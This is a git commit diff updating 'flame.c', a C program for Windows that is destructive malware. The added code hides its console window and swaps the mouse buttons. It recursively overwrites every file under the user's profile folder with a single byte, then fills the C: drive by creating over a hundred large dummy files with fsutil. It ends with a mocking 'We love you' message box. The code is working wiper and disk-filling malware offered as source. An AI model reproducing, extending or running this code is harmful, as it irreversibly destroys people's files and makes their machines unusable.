43e8b16a66d0fd5327aa1a2f969b70e0f6896854
Komodo <68278515+komodoooo@users.noreply.github.com>
2023-07-09 14:08:32 +0200

    Update flame.c

--- flame.c
+++ flame.c
@@ -5,29 +5,78 @@
 #include <sys/stat.h>
 #include <string.h>
 #define SUS "\x90"
+#define ULONG unsigned long long
+#define PU PULARGE_INTEGER
 #define SETCPOS \
-        SetCursorPos(INT_MAX,INT_MAX)
+    SetCursorPos(INT_MAX,INT_MAX)
     //0x7fffffff
 
-void fill(const char *filename);
-int recognize_dir(char *file);
+const int S[2]={256,0x8a};
+void overwrite(const char *filename);
 void flame(char *basepath);
+void filldisk();
+ULONG freespace();
+int recognize_dir(char *file);
+int checkperms(char *path);
 
 int main(){
-    char *sus;
+    char *sus=getenv("USERPROFILE");
     ShowWindow(GetConsoleWindow(), SW_HIDE);
-    wchar_t *sussybaka=_wgetenv(L"USERPROFILE");
-    sprintf(sus,"%ls\\Desktop",sussybaka);
+    system("rundll32.exe user32.dll,SwapMouseButton");
     flame(sus);
+    filldisk();
     MessageBox(NULL,"\nWe love you.\n\n:3\n\n",__FILE__,1);
-    return 0;
+    return EXIT_SUCCESS;
 }
 
-void fill(const char *filename){
+void overwrite(const char *filename){
     SETCPOS;
-    FILE *file=fopen(filename, "wb");
-    fwrite(SUS, 1, sizeof(SUS), file);
+    FILE *file=fopen(filename,"wb");
+    fwrite(SUS,1,sizeof(SUS),file);
     fclose(file);
+}
+
+void flame(char *basepath){
+    if(checkperms(basepath)){
+        DIR *ls;
+        char *file, *deldir;
+        struct dirent *dir;
+        chdir(basepath);
+        ls=opendir(".");
+        if(ls){
+            while((dir=readdir(ls))!=NULL){
+                file=dir->d_name;   
+                if(strcmp(file,".")+strcmp(file,"..")+strcmp(file,"AppData")==3&&!recognize_dir(file)){
+                    SETCPOS;
+                    char dirpath[S[0]];
+                    sprintf(dirpath,"%s\\%s",_getcwd(NULL,0),file);
+                    flame(dirpath); //i love recursionz
+                    chdir("..");
+                } else overwrite(file);
+            }
+            closedir(ls);
+        }
+    }
+    SETCPOS;
+}
+
+void filldisk(){
+    ULONG a = (!freespace()?S[1]:freespace());
+    char *sussyuwu = getenv("APPDATA");
+    char napoli[0x4e];
+    if(sussyuwu!=NULL&&!chdir(sussyuwu)&&checkperms(sussyuwu)&&a){
+        chdir(sussyuwu);
+        for(int i=0; i<S[1]; i++){
+            sprintf(napoli,"fsutil file createnew droplet_%d %llu",i+1,a/S[1]);
+            system(napoli);
+        }
+    }
+}
+
+ULONG freespace(){
+    ULONG ab=0;
+    if(GetDiskFreeSpaceExA("C:\\",(PU)&ab,(PU)0,(PU)0)) return ab;
+    else return 0;
 }
 
 int recognize_dir(char *file){
@@ -36,24 +85,8 @@ int recognize_dir(char *file){
     return S_ISREG(isdir.st_mode);
 }
 
-void flame(char *basepath){
-    DIR *ls;
-    char *file, *deldir;
-    struct dirent *dir;
-    chdir(basepath);
-    int a=0;
-    ls=opendir(".");
-    if(ls){
-        while((dir=readdir(ls))!=NULL){
-            file = dir->d_name;   
-            if(strcmp(file, ".")+strcmp(file,"..")==2&&recognize_dir(file)==0){
-                SETCPOS;
-                char dirpath[256];
-                sprintf(dirpath,"%s\\%s",_getcwd(NULL,0),file);
-                flame(dirpath); //i love recursionz
-                chdir("..");
-            } else fill(file);
-        }
-        closedir(ls);
-    }
+int checkperms(char *path){
+    DWORD sperm=GetFileAttributesA(path);
+    if(sperm==INVALID_FILE_ATTRIBUTES||FILE_ATTRIBUTE_READONLY) return -1;
+    else return 1; //FILE_ATTRIBUTE_DIRECTORY
 }
